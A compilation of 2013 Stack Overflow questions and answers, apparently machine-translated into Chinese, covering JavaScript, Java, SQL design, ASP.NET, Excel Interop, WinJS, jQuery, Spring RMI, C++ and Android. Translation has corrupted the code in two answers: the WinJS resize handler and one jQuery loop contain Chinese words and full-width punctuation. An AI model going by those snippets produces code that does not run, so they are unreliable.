> 赞同：3
> 
> 时间：2013-04-25T13:18:37.893

在第一种情况下`MyObject`是**构造函数**，因为它应该被调用`new`：

```
var obj = new MyObject(); 
```

在第二种情况下，`MyObject`它只是一个对象，您为其分配属性。它没有特殊的名称。

请注意，在这两种情况下`MyObject`都有不同的值。`MyObject`在第二种情况下等价于`obj`。

第三种方法是使用对象初始化器或“对象字面量”：

```
var obj = {
    aMethod: function(){},
    anotherMethod: function(){}
}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T14:05:35.490

您的第一个示例是**Object Constructor**，而第二个示例只是将公共方法作为属性添加到对象。附带说明一下，对于更“类”的行为，请查看[模块模式](http://addyosmani.com/resources/essentialjsdesignpatterns/book/#modulepatternjavascript)：

```
var MyObject = (function() {

  var privateStaticVariable = 0;

  var my = function() {
    var self = this;

    var privateInstanceVariable = 0;

    function privateInstanceMethod() {

    }

    self.publicInstanceVariable = 0;

    self.publicInstanceMethod = function() {

    };
  };

  function privateStaticMethod() {

  };

  return my;
}); 
```

# internet-explorer - IE 将目标保存为 pdf 文件

> ID：16215782
> 
> 赞同：0
> 
> 时间：2013-04-25T13:14:58.707
> 
> 标签：internet-explorer, pdf, command-line, savefiledialog

在 IE 中，如果我打开 pdf 文件的任何链接，由于关联，它会在浏览器本身中打开。但我希望它打开一个保存窗口，询问用户使用命令行在哪里保存（与保存目标相同）。怎么做？

# java - 如何在字符串数组中搜索特定字符串

> ID：16215784
> 
> 赞同：0
> 
> 时间：2013-04-25T13:15:04.890
> 
> 标签：java, arrays

我正在尝试在数组中搜索从句子中的单词中获得的几个特定字符串。最终这句话将由用户输入，但我现在已经硬编码了它以使测试更容易。如果程序找到字符串，它应该返回“是”，如果没有，则返回“否”。问题是我一直都在接受。

```
public class main {
public static void main(String[]args)
{

    String Sentence = "This is a sentence";
    String[] CensorList =
        {"big","head"};

    String[] words = Sentence.split(" ");
    System.out.println(words.length);
    boolean match = false;

    for(int i = 0; i < words.length; i++)
    {
        for (int j = 0; j < CensorList.length; j++)
        {
            if(words[i].equals(CensorList[j]))
            {
                match = true;
        }else{
            match = false;
        }
    }

    }
    if (match = true){
        System.out.println("Yes");}
    else{
        System.out.println("No");
} 
```

} }

我非常感谢您对此提供的任何帮助，在此先感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:18:02.573

第二个 for() 中的 if 有错误的大括号。

试试这个：

```
for (int j = 0; j < CensorList.length; j++)
{
    if(words[i].equals (CensorList[j])) {
        match = true;
        System.out.println("Yes");
    } else {
        System.out.println("No");
    }
    match = false;
} 
```

* * *

第二次尝试：

这

```
if (match = true) 
```

不将 match 与 true 进行比较，它将 match 标志设置为 true，结果始终为 true。

比较 if 中的标志：

```
if (match == true) // or simply if (match)
{ .... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:18:40.527

试试看：

```
for(int i = 0; i < words.length; i++)
{
    for (int j = 0; j < CensorList.length; j++)
    {
        if(words[i].equals (CensorList[j])) 
            match = true;
    }
            if (match) {
                System.out.println("Yes"); }
            else {
                System.out.println("No"); }
            match = false;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T13:19:22.863

我想你这里有一些错别字。

```
 for (int j = 0; j < CensorList.length; j++)
    {
           if(words[i].equals (CensorList[j]));
    } 
```

这基本上不会做任何事情，因为如果表达式被评估为 true，则 if 无关紧要。然后在循环之后将 match 设置为 true，因此它始终为 true，并且始终打印“Yes”

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-25T13:20:45.337

您可以为此使用一个简单的基于 RegEx 的解决方案

```
private static boolean test(String value) {
    String[] CensorList = { "This", "No" };

    for (String string : CensorList) {
        Pattern pattern = Pattern.compile("\\b" + string + "\\b", Pattern.CASE_INSENSITIVE);
        if (pattern.matcher(value).find()) {
            return true;
        }
    }
    return false;
} 
```

然后

```
String string = "This is a sentence";
if(test(string)){
    System.out.println("Censored");
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-25T13:17:51.160

您不使用的任何原因[`String.indexOf(String)`](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#indexOf%28java.lang.String%29)？

另一个问题是，如果您为相同的（非常大的）搅拌重复执行此操作，在这种情况下，您可能需要研究更复杂的算法，如[后缀树](http://en.wikipedia.org/wiki/Suffix_tree)，甚至使用[Apache Lucene等专用软件](http://lucene.apache.org/core/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-25T13:20:04.003

尝试使用

```
public class main {
public static void main(String[]args)
{

    String Sentence = "This is a sentence";
    String[] CensorList =
        {"This","No"};

    String[] words = Sentence.split(" ");
    System.out.println(words.length);
    boolean match = false;

    for(int i = 0; i < words.length; i++)
    {
        for (int j = 0; j < CensorList.length; j++)
        {
            if(words[i].compareTo(CensorList[j])==0)
            {
                System.out.println("Yes");
            }
            else{System.out.println("No");}

        }
    }

} 
```

# google-maps - 使用信息框错误异步加载 Google 地图

> ID：16215786
> 
> 赞同：0
> 
> 时间：2013-04-25T13:15:09.950
> 
> 标签：google-maps

从昨天开始，我一直在尝试解决这个问题，但我无法理解它。我正在异步加载我的谷歌地图，但以下代码会引发一个错误，这是由于信息框未正确加载。

我的错误是：未定义信息框

我的代码是：

```
function loadScript(callback) {
   var map = document.createElement('script');
   map.type = 'text/javascript';
   map.src = 'https://maps.googleapis.com/maps/api/js?key=my_key_goes_here&sensor=false&callback=initialize';
   document.body.appendChild(map);            
   map.onload = function() {
      var box = document.createElement('script');
      box.type = 'text/javascript';
      box.src = 'https://google-maps-utility-library-v3.googlecode.com/svn/trunk/infobox/src/infobox_packed.js';
      document.body.appendChild(box);
      box.onload = callback;
   };
}           
window.onload = loadScript; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:52:29.470

You specify an argument to your loadScript, 'callback'. Then in your map.src you specify `callback=initialize`. You call loadScript on window.onload, but you don't specify an argument to it. So box.onload doesn't know any value for `callback` I'm guessing, as it can't magically guess 'initialize' from the map.src string.

Make sense?

# c++ - is it necessary to explicitly limit the number of threads

> ID：16215788
> 
> 赞同：1
> 
> 时间：2013-04-25T13:15:14.267
> 
> 标签：c++, linux, parallel-processing

When running a multithreaded application, is it necessary to explicitly specify the maximum number of threads used for the application, or will Linux administrate it by itself? If Linux handles it by itself, I would expect it to be "social", in the sense that the CPU is divided between all users. But maybe I am wrong about this?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:25:41.983

某些系统具有系统可以处理的最大线程数，但大多数系统只是在此之前耗尽内存[某种]。

如果您的线程“没有做太多”，那么您可能拥有任意数量的线程（尽管处理数千个线程可能会导致运行速度变慢，因为系统会时不时地“遍历”每个线程系统）。如果您的线程在计算等方面很繁重，那么系统中的其他进程为这些进程留出一些空闲的 CPU 容量是“很好的”。

所以，这真的不是一成不变的事情，而是取决于你想要实现的目标。当然，整个系统的用途是——如果您的任务是为 BMW 新车的空气动力学建模，那么使用 99.999% 的 CPU 进行空气动力学计算是非常好的。如果这台机器是一个专用的网络服务器，使用 99.99% 的 CPU 来服务网页也完全没问题。如果是某人的台式机用来浏览网页、写电子邮件和编译代码，那么使用 99.99% 的可用 CPU 来傅里叶变换他们的音乐收藏以检查重复歌曲可能不是一个理想的解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:18:54.720

程序本身决定了它启动了多少线程，而不是操作系统。至于当一个进程启动太多线程时会发生什么，这取决于[调度程序](https://stackoverflow.com/q/8463741/166749)。

# sql - SQL Relationship Cardinality in Logical Design

> ID：16215789
> 
> 赞同：1
> 
> 时间：2013-04-25T13:15:18.387
> 
> 标签：sql, database-design, relationship, cardinality

I have the following issue. We are currently working on a system for a shuttle service company. Now, part of the entities in the database for this system include numerous lookup tables (such as vehicle_type, employee_status, etc), as well as some other tables, such as vehicle and vehicle_service log.

Now the issue we as a team are having is that we cannot agree on what the logical relationship cardinalities between entities should be. The two main problem relationships include the tables defined as follows:

```
CREATE TABLE IF NOT EXISTS `user_type` (
  `type_id` tinyint(4) NOT NULL AUTO_INCREMENT,
  `description` varchar(200) NOT NULL,
  PRIMARY KEY (`type_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Store the user types - employee
 or consultant' AUTO_INCREMENT=1 ; 
```

which is linked to

```
CREATE TABLE IF NOT EXISTS `user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  `user_type` tinyint(4) NOT NULL,
  PRIMARY KEY (`user_id`),
  KEY `user_type` (`user_type`),
  KEY `username` (`username`),
  KEY `login` (`username`,`password`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Table used when logging in 
to check access level, type of user, etc. ' AUTO_INCREMENT=1 ; 
```

The `user` table includes other irrelevant data. So the issue here is that I say (because MySQL Workbench reverse engineered it that way and it makes more sense) that the relationship should be 1-many, while another team member says that it should be 0-many (because some records may exist in the `user_type` table that aren't used in the `user` table)

The other table relationship we are having words about are defined as follows:

```
CREATE TABLE IF NOT EXISTS `vehicle` (
  `vehicle_id` int(11) NOT NULL AUTO_INCREMENT,
  `registration_number` varchar(10) NOT NULL,
  PRIMARY KEY (`vehicle_id`),
  UNIQUE KEY `registration_number` (`registration_number`),
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Actual vehicle information'
 AUTO_INCREMENT=1 ; 
```

Again, with some other columns not relative to the question. This links with

```
CREATE TABLE IF NOT EXISTS `service_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `vehicle_id` int(11) NOT NULL,
  `description` text NOT NULL,
  `date` date NOT NULL,
  `cost` double NOT NULL,
  PRIMARY KEY (`id`),
  KEY `vehicle_id` (`vehicle_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Store records of all services 
to vehicles' AUTO_INCREMENT=1 ; 
```

Should this be 1-many or 0-many because a vehicle may not yet go in for a service? According to me it should be 1-many, but I don't know if this works logically.

We are all very confused about this whole logical modelling thing, so any help would be much appreciated!

I figured it would be easier for me to create the DB first and then reverse engineer it to a physical model, but never though about logical.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:36:30.293

如果它是可选的，则从零到多。例如，销售代表将有零个或多个客户。这是为什么？因为如果有一个新的销售代表，那么这意味着他/她没有客户可以开始，除非他/她当然承担已辞职的销售代表的账户。

另一方面，一个或多个是强制性的。例如，具有订单日期的订单和订购的客户应在订单详细信息表中至少有一条记录。假设客户在 2013 年 4 月 22 日最后订购了一台平板电脑，那么他/她将拥有：

```
 Order table
 ----------------------------------------
 Orderid.  OrderDate. Customermnum
 ----------------------------------------
  1\.       04/22/2013 101

 Order detail table
 ----------------------------------------
 Orderid.  Productid.  Qty.   quotedprice
 ----------------------------------------
  1\.       T101       1       500 
```

因此，在您的情况下，User 到 UserType 是 1 到 0 或很多，因为用户类型可能尚未被任何用户使用。

现在，vehicle to service 它也是 1 比 0 或许多，因为车辆可能不一定已经完成服务。

# c# - Asp:Menu 在 IE 6 中无法按预期工作。但在 IE 7 及更高版本中工作正常

> ID：16215791
> 
> 赞同：1
> 
> 时间：2013-04-25T13:15:25.333
> 
> 标签：c#, asp.net

下面在我的 aspx 页面的我的菜单控件代码中

```
<table width="100%" cellpadding="0" cellspacing="0" style="background-color: Black; height: 30px; ">
        <tr style="background-color: Black; height: 30px;">
            <td  style="background-color: Black; width: 100%; height: 30px;">
            <div style="height:30px">
                <asp:Menu ID="NavigationMenu" runat="server" EnableViewState="false" RenderingMode="Default" CssClass="menu" ForeColor="White"
                    IncludeStyleBlock="false" Orientation="Horizontal" Height="30px" OnMenuItemClick="NavigationMenu_MenuItemClick" >
                    <StaticMenuItemStyle CssClass="menuitem" />
                    <DynamicMenuItemStyle CssClass="menuitem" />
                    <Items>
                        <asp:MenuItem NavigateUrl="~/Home.aspx" Text="Home" ToolTip="Home page" />
                        <asp:MenuItem NavigateUrl="~/CommonUser.aspx" Text="Create / Edit User Access" ToolTip="Provide access to users" />
                        <asp:MenuItem NavigateUrl="~/BulkUpload.aspx" Text="Bulk Upload" ToolTip="To bulk upload users " />
                        <asp:MenuItem NavigateUrl="~/SearchUser.aspx" Text="View / Revoke User Access" ToolTip="View existing users access" />

                        <asp:MenuItem Text="Admin" NavigateUrl="javascript:void(0);">
                            <asp:MenuItem NavigateUrl="javascript:void(0);" Text="User" ToolTip="Create / Edit User for the application">
                                <asp:MenuItem Text="Create User" NavigateUrl="~/AdminUser.aspx" />
                                <asp:MenuItem Text="Edit User" NavigateUrl="~/EditAdminUser.aspx" />
                            </asp:MenuItem>
                            <asp:MenuItem Text="Template" NavigateUrl="javascript:void(0);">
                                <asp:MenuItem Text="Create Template" />
                                <asp:MenuItem Text="Edit Template" />
                            </asp:MenuItem>
                            <asp:MenuItem NavigateUrl="javascript:void(0);" Text="Server" ToolTip="Add / Edit server Details">
                                <asp:MenuItem Text="Add Server" NavigateUrl="~/AddServers.aspx" />
                                <asp:MenuItem Text="Edit Server" NavigateUrl="~/EditServer.aspx" />
                            </asp:MenuItem>
                            <asp:MenuItem NavigateUrl="~/CreateConString.aspx" Text="Environment Password" ToolTip="Change password for connection string" />
                        </asp:MenuItem>

                    </Items>
                </asp:Menu>
                </div>
            </td>
        </tr>
    </table> 
```

我有 2 个问题

1.  我无法选择子菜单。他们正在显示但无法选择它。一旦我将鼠标移到子菜单上，子菜单就会消失
2.  菜单在最大化窗口时移动到屏幕左侧。在鼠标悬停事件菜单正确对齐

下面是代码是如果在 IE 视图源中查看它

```
<table width="100%" cellpadding="0" cellspacing="0" style="background-color: Black; height: 30px; ">
        <tr style="background-color: Black; height: 30px;">
            <td  style="background-color: Black; width: 100%; height: 30px;">
            <div style="height:30px">
                <a href="#NavigationMenu_SkipLink"><img alt="Skip Navigation Links" src="/FacetsUserSetupApp/WebResource.axd?d=E02KDPXufVQc2nUrHjGfkA2&amp;t=634836496018543211" width="0" height="0" style="border-width:0px;" /></a><div class="menu" id="NavigationMenu">
    <ul class="level1">
        <li><a title="Home page" class="level1 menuitem" href="Home.aspx">Home</a></li><li><a title="Provide access to users" class="level1 menuitem" href="CommonUser.aspx">Create / Edit User Access</a></li><li><a title="To bulk upload users " class="level1 menuitem" href="BulkUpload.aspx">Bulk Upload</a></li><li><a title="View existing users access" class="level1 menuitem" href="SearchUser.aspx">View / Revoke User Access</a></li><li><a class="popout level1 menuitem" href="javascript:void(0);">Admin</a><ul class="level2">
            <li><a title="Create / Edit User for the application" class="popout level2 menuitem" href="javascript:void(0);">User</a><ul class="level3">
                <li><a class="level3 menuitem" href="AdminUser.aspx">Create User</a></li><li><a class="level3 menuitem" href="EditAdminUser.aspx">Edit User</a></li>
            </ul></li><li><a class="popout level2 menuitem" href="javascript:void(0);">Template</a><ul class="level3">
                <li><a class="level3 menuitem" href="#" onclick="__doPostBack(&#39;ctl00$NavigationMenu&#39;,&#39;Admin\\Template\\Create Template&#39;)">Create Template</a></li><li><a class="level3 menuitem" href="#" onclick="__doPostBack(&#39;ctl00$NavigationMenu&#39;,&#39;Admin\\Template\\Edit Template&#39;)">Edit Template</a></li>
            </ul></li><li><a title="Add / Edit server Details" class="popout level2 menuitem" href="javascript:void(0);">Server</a><ul class="level3">
                <li><a class="level3 menuitem" href="AddServers.aspx">Add Server</a></li><li><a class="level3 menuitem" href="EditServer.aspx">Edit Server</a></li>
            </ul></li><li><a title="Change password for connection string" class="level2 menuitem" href="CreateConString.aspx">Environment Password</a></li>
        </ul></li>
    </ul>
</div><a id="NavigationMenu_SkipLink"></a>
                </div>
            </td>
        </tr>
    </table> 
```

我不确定如何为 A 控件使用 rendercompatibility 属性。任何人都可以请帮助我为菜单控件声明相同的内容

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:35:09.250

对于每个版本的 ASP.NET，控件可能会输出不同的 HTML。通常，这不是什么大问题，而且所有 ASP.NET 版本似乎都可以与 IE6 一起使用。IE6 是 ASP.NET 1 和 1.1 发布时的主导浏览器，甚至可能在 ASP.NET 2 发布时也是如此。

但现在，随着 ASP.NET 4，微软对 H​​TML 进行了现代化改造，使其更符合当前标准（更少的表格，更多的 div、ul、li 等）。这是有道理的，因为现在所有流行的浏览器都支持这些标签以获得漂亮的布局。即使是 Internet Explorer，也已经远离 IE6。

如果您的站点仍然必须支持 IE6，但您需要或想要 ASP.NET 4 功能（就像公司内联网网站上的很多功能），这会产生向后兼容性问题。因此，Microsoft为您的 web.config引入了[ControlRenderingCompatibilityVersion属性，并为您的控件引入了](http://msdn.microsoft.com/en-us/library/system.web.configuration.pagessection.controlrenderingcompatibilityversion%28v=vs.100%29.aspx)[RenderingCompatibility](http://msdn.microsoft.com/en-us/library/system.web.ui.control.renderingcompatibility%28v=vs.100%29.aspx)属性。

我会说试试看。将菜单的`RenderingCompatibility`属性设置为 3.5 版，看看会有什么不同。

然而，有理由放弃对 IE6 的支持。即使您的客户目前仍在使用 IE6，它还能持续多久？考虑到安全性、速度、支持和其他影响，升级浏览器有令人信服的理由。

# c# - Excel Interop, iterating workbook for worksheet and chart

> ID：16215792
> 
> 赞同：2
> 
> 时间：2013-04-25T13:15:30.390
> 
> 标签：c#, .net, office-interop, excel-interop

I have a scenario while working with Microsoft Excel Interop.

```
System.Collections.IEnumerator wsEnumerator = excelApp.ActiveWorkbook.Worksheets.GetEnumerator();
while (wsEnumerator.MoveNext())
{
    wsCurrent = (Excel.Worksheet)wsEnumerator.Current;
    //Worksheet operation Follows   
} 
```

I am operating on Worksheets, so i can not have Chart in this. What i want to do achieve is operate on Sheets and check if it is a Worksheet or Chart, and act accordingly.

As sheets contain both Worksheet, Chart and "Excel 4.0 Macro", so what is the type of Sheets each entry as it can hold any of the type mentioned.

```
System.Collections.IEnumerator wsEnumerator = workBookIn.Sheets.GetEnumerator();
while (wsEnumerator.MoveNext())
{
    //Identify if its a chart or worksheet
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:37:10.343

通过检查当前枚举器的类型来解决它

```
var item = wsEnumerator.Current;                   
if (item is Excel.Chart)
{
    //Do chart operations
}
else if (item is Excel.Worksheet)
{
    //Do sheetoperations
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-03-25T12:03:55.100

您可以重写整个代码（没有枚举器）：

```
foreach (dynamic sheet in workBookIn.Sheets)
{
    if (sheet is Chart)
        // Write your code
    else if (sheet is Worksheet)
        // Write your code
} 
```

# javascript - Switching from GridView to ListView when Windows Store app is snapped

> ID：16215795
> 
> 赞同：0
> 
> 时间：2013-04-25T13:15:39.360
> 
> 标签：javascript, listview, windows-8, winjs

I am trying to change the layout of my listView control from "GridView" to "ListView" when application gets snapped. Of course, it should return to "GridView" in any other state. I wrote some code, but it doesn't work, so I wonder why...

This is the code I've written:

```
var viewState = Windows.UI.ViewManagement.ApplicationView;
var list = document.getElementById("messageDisplay").winControl;
if (viewState == Windows.UI.ViewManagement.ApplicationViewState.snapped) {
    list.layout = new WinJS.UI.ListLayout();
}
else
{
    list.layout = new WinJS.UI.GridLayout();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T18:35:23.663

从[这里](http://msdn.microsoft.com/en-us/library/windows/apps/jj150600.aspx)获取只需监听 resize 事件并对列表视图的布局属性进行更改。

我不知道你的代码在哪里调用了类似的代码，所以这是你需要的整个方法

```
window.addEventListener("resize", function (e) {
    var currentViewState = Windows.UI.ViewManagement.ApplicationView.value;
    var snapped = Windows.UI.ViewManagement.ApplicationViewState.snapped;

    if (currentViewState === snapped) {
        that.listView.layout = new WinJS.UI.ListLayout();
    }
    else if (lastViewState === snapped && currentViewState !== snapped) {
        that.listView.layout = new WinJS.UI.GridLayout();
    }

    上一个视图状态 = 当前视图状态；
});

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-27T08:43:40.987

尝试调用 list.forceLayout() 它多次救了我的命... ;-)

# javascript - How to style specific a tag

> ID：16215797
> 
> 赞同：3
> 
> 时间：2013-04-25T13:15:44.430
> 
> 标签：javascript, jquery, html, css, styling

I have a lot of links look something like this:

```
<a href="http://www.youtube.com/user/nigahiga">Youtube</a>
<a href="http://pinterest.com/pin/41236152807615600/">Pinterest</a>
<a href="https://www.facebook.com/manchesterunited">Facebook</a>
<a href="http://www.youtube.com/user/RayWilliamJohnson">Youtube</a> 
<a href="http://pinterest.com/pin/24910604158520050/">Pinterest</a> 
```

How can I style only the hyperlinks that will be linked to `pinterest`. I tried this:

```
$('a').attr('href').contains('pinterest').css('Styling here'); 
```

But it does not work. How to achieve it?

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-25T13:17:05.107

您可以使用[属性包含选择器](http://api.jquery.com/attribute-contains-selector/)：

```
$('a[href*="pinterest"]').css('color','DeepSkyBlue'); 
```

或者更好只需要纯 css：

```
a[href*="pinterest"] {  
    color: DeepSkyBlue;
} 
```

**[小提琴](http://jsfiddle.net/YdbAq/)**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:23:15.627

```
 $('a[href*="pinterest"]').css('apply styles'); 
```

选择器文档可以在[http://docs.jquery.com/Selectors找到](http://docs.jquery.com/Selectors)

```
For attributes:

= is exactly equal
!= is not equal
^= is starts with
$= is ends with
*= is contains 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:20:48.427

您可以使用下一个选择器获取链接到 pinterest 的所有超链接：

```
$('a[href^="http://pinterest.com/"]') 
```

该选择器将返回所有“a”元素，其中“href”属性以[http://pinterest.com/开头](http://pinterest.com/)

然后你可以给它们设置样式

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T13:21:16.703

除了属性包含解决方案（虽然不那么整洁），您还可以使用[过滤器](http://api.jquery.com/filter/)功能：

```
$('a').filter(function () {
    return $(this).attr("href").indexOf("pinterest") != -1;
}).css('color', 'red'); 
```

[这是一个工作示例](http://jsfiddle.net/q56PZ/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-25T13:39:01.990

您应该检查每个 a 的 href attr 值。

$('a').each(函数(){

if($(this).attr('href').contains('pinterest'))

$(this).css（你的风格）；

});

# spring - java.rmi.ConnectException：连接拒绝使用 spring RMI 托管

> ID：16215799
> 
> 赞同：1
> 
> 时间：2013-04-25T13:15:51.453
> 
> 标签：spring, rmi

我正在尝试开发一个小型 spring rmi 示例。

我创建了远程服务接口和服务如下，

# 计算.java

```
package com;

public interface Calculation {
  String getName(String name);

} 
```

# CalImp：

```
package com;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class CalImp implements Calculation {
    static void init(){
        ApplicationContext context = new
                 ClassPathXmlApplicationContext("applicationContext.xml");
        context.getBean("calculationBean");
    }
    String names;
    public String getName(String name){
        return names;
    }
} 
```

# 我的应用程序上下文文件是

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="calculationBean" class="com.CalImp"></bean>

    <bean class="org.springframework.remoting.rmi.RmiServiceExporter" destroy-method="destroy">
        <property name="serviceName" value="Calculation"></property>
        <property name="service" ref="calculationBean"></property>
        <property name="serviceInterface" value="com.Calculation"></property>
        <property name="replaceExistingBinding" value="true"></property>
        <property name="registryPort" value="1199"></property>
    </bean>
</beans> 
```

然后我的客户类如下，

# 客户端-beans.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="easyClient" class="com.tutorialspoint.Client">
         <property name="easyServer" ref="calculationBean"/>
    </bean>

    <bean id="calculationBean" class="org.springframework.remoting.rmi.RmiProxyFactoryBean">
        <property name="serviceUrl" value="rmi://192.168.2.39:1199/Calculation"></property>
        <property name="serviceInterface" value="com.Calculation"></property>
    </bean>
</beans> 
```

# 客户端.Java：

```
package com.tutorialspoint;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.context.support.FileSystemXmlApplicationContext;

import com.Calculation;

public class Client {
private Calculation easyServer;
public void setEasyServer(Calculation easyServer) {
    this.easyServer = easyServer;
 }

 public String  getdata(){
     ApplicationContext context = new ClassPathXmlApplicationContext("client-beans.xml");
     easyServer =(Calculation) context.getBean("easyClient");
     String name=easyServer.getName("praveen");
     return name;
 }
} 
```

我尝试使用以下测试实用程序对其进行测试，

1) 测试.java

```
package com;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Test {

    /**
     * @param args
     */
    public static void main(String[] args) {
        Registry registry;
        String serverAddress="localhost";
        String serverPort="1199";
        String text="Hi";
        System.out.println("sending "+text+" to "+serverAddress+":"+serverPort);
        try{
        // get the “registry”
        registry=LocateRegistry.getRegistry(serverAddress,(new Integer(serverPort)).intValue());
        registry.lookup("Calculation") ;

        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }   
} 
```

当我尝试这个时，我得到了以下异常，即使尝试使用我的 ip "192.#.#.#"，但仍然没有运气。

```
sending Hi to localhost:1199
java.rmi.ConnectException: Connection refused to host: localhost; nested exception is: 
    java.net.ConnectException: Connection refused: connect
    at sun.rmi.transport.tcp.TCPEndpoint.newSocket(Unknown Source)
    at sun.rmi.transport.tcp.TCPChannel.createConnection(Unknown Source)
    at sun.rmi.transport.tcp.TCPChannel.newConnection(Unknown Source)
    at sun.rmi.server.UnicastRef.newCall(Unknown Source)
    at sun.rmi.registry.RegistryImpl_Stub.lookup(Unknown Source)
    at com.Test.main(Test.java:20)
Caused by: java.net.ConnectException: Connection refused: connect
    at java.net.DualStackPlainSocketImpl.connect0(Native Method)
    at java.net.DualStackPlainSocketImpl.socketConnect(Unknown Source)
    at java.net.AbstractPlainSocketImpl.doConnect(Unknown Source)
    at java.net.AbstractPlainSocketImpl.connectToAddress(Unknown Source)
    at java.net.AbstractPlainSocketImpl.connect(Unknown Source)
    at java.net.PlainSocketImpl.connect(Unknown Source)
    at java.net.SocksSocketImpl.connect(Unknown Source)
    at java.net.Socket.connect(Unknown Source)
    at java.net.Socket.connect(Unknown Source)
    at java.net.Socket.<init>(Unknown Source)
    at java.net.Socket.<init>(Unknown Source)
    at sun.rmi.transport.proxy.RMIDirectSocketFactory.createSocket(Unknown Source)
    at sun.rmi.transport.proxy.RMIMasterSocketFactory.createSocket(Unknown Source)
    ... 6 more 
```

有人可以在这个问题上帮助我吗？

# c++ - 将临时绑定到 const 引用的特定形式无效

> ID：16215806
> 
> 赞同：0
> 
> 时间：2013-04-25T13:16:10.157
> 
> 标签：c++, temporary, const-reference

给定

```
struct A
{
    void a(void) { std::cout << "A" << std::endl; }
};

const A &a = A(); /* Make a copy of A and bind to a */
const A &b(A());  /* Does nothing */

a.a(); /* Prints A */
b.a(); /* Error, same as if b doesn't exist */ 
```

为什么第二种形式的“将临时绑定到 const 引用”似乎等同于无操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:18:44.010

这只是[最令人烦恼的 parse](http://en.wikipedia.org/wiki/Most_vexing_parse)的另一种情况，您正在声明一个函数而不是对`A`.

您可以通过使用 C++11 统一初始化来解决此问题：

```
const A &b{A()}; 
```

# android - 延迟一段时间后出现解锁屏幕

> ID：16215811
> 
> 赞同：1
> 
> 时间：2013-04-25T13:16:29.113
> 
> 标签：android, android-layout, countdowntimer

在我的应用程序中，最后我会显示一个 15 秒的祝贺屏幕，这是一个包含单个图像的新活动，然后屏幕变黑，然后设备被锁定。

现在我立即单击解锁按钮，以便出现提示输入密码的解锁屏幕。但只有在点击解锁按钮**两次**后（即至少5秒后），才会出现密码提示。

密码提示屏幕延迟的原因是什么？

经过一番搜索，我发现了一些链接，哪个状态的*省电模式激活*或*sd 卡安装*可能是延迟的原因。但如果是这样的话，比我不使用应用程序时，设备怎么不会面临延迟？

任何帮助表示赞赏。

**请注意**，如果我在黑屏出现大约 10 秒后尝试按下解锁按钮，解锁屏幕会立即出现。

**最终活动.java**

```
public class FinalActivity extends Activity {
    WindowManager.LayoutParams params1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.endenroll);
        MyCountDec c = new MyCountDec(15000, 1000);
        c.start();
    }

    @Override
    protected void onResume() {
        super.onResume();
        params1 = getWindow().getAttributes();
        params1.screenBrightness = -1;
        getWindow().setAttributes(params1);
        super.onResume();
    }

    public class MyCountDec extends CountDownTimer {
        public MyCountDec(long millisInFuture, long countDownInterval) {
            super(millisInFuture, countDownInterval);
        }

        @Override
        public void onFinish() {
            params1 = getWindow().getAttributes();
            params1.screenBrightness = 0;
            getWindow().setAttributes(params1);
        }

        @Override
        public void onTick(long millisUntilFinished) {
        }
    }
} 
```

# php - PHP MYSQL 使用 LIKE 搜索邮政编码

> ID：16215815
> 
> 赞同：0
> 
> 时间：2013-04-25T13:16:48.987
> 
> 标签：php, mysql

